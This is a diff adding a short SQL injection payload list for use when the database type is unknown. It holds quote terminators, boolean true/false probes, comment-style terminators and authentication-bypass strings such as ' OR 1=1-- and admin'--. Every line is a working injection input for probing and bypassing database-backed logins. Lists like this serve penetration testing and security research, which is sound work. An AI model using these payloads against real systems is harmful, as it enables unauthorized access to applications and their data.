@@ -1,0 +1,32 @@
+# Generic — Detection Payloads (DB-agnostic)
+# Use when DB is unknown or unconfirmed
+
+# --- Quote terminators ---
+'
+''
+"
+`
+
+# --- Boolean probes ---
+' OR '1'='1
+' OR '1'='2
+' AND '1'='1
+' AND '1'='2
+1 OR 1=1
+1 OR 1=2
+1 AND 1=1
+1 AND 1=2
+
+# --- Comment styles ---
+'--
+'-- -
+'#
+'/*
+
+# --- Auth bypass ---
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin'#
+' OR 'x'='x
